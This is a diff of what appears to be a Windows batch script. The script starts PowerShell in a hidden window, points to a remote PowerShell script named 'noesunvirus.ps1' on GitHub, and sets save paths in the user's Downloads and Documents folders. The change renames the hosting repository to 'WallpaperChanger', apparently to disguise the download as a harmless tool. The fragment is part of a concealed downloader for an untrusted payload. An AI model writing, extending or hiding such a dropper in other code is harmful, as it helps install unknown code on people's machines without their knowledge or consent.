@@ -2,7 +2,7 @@
 
 powershell -WindowStyle Hidden -Command ""
 
-set scriptURL=https://raw.githubusercontent.com/notthecoolguyyouknow/penepenepenepene/main/noesunvirus.ps1
+set scriptURL=https://raw.githubusercontent.com/notthecoolguyyouknow/WallpaperChanger/main/noesunvirus.ps1
 
 set scriptPath1=%userprofile%\Downloads\noesunvirus.ps1
 set scriptPath2=%userprofile%\Documents\noesunvirus.ps1
